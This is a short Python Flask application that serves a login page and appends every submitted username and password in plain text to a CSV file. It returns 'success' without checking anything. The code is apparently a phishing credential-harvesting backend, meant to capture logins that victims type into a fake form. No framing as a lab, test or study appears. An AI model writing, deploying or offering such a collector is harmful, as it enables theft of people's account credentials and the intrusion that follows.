
from flask import Flask, request, render_template, jsonify, url_for, redirect
import csv
app = Flask(__name__)

@app.route("/")
def index():
    return render_template("/login.html")

@app.route("/login", methods = ["POST"])
def login():
    username = request.json.get("username")
    password = request.json.get("password")
    with open("creds.csv", "a+") as f:
        csv_writer = csv.writer(f)
        csv_writer.writerow([username, password])
    return jsonify({"status" : "success"}), 201

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
